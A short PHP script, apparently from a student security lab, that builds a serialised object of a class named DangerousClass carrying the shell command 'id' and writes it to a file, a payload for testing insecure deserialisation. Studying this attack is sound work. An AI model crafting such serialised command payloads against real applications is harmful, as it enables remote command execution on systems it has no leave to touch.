<?php
class DangerousClass {
    public $cmd;
    function __construct() {
        $this->cmd = "id";
    }
}

$a = new DangerousClass();
$b = serialize($a);
file_put_contents("serial_Nhom09", $b);
?>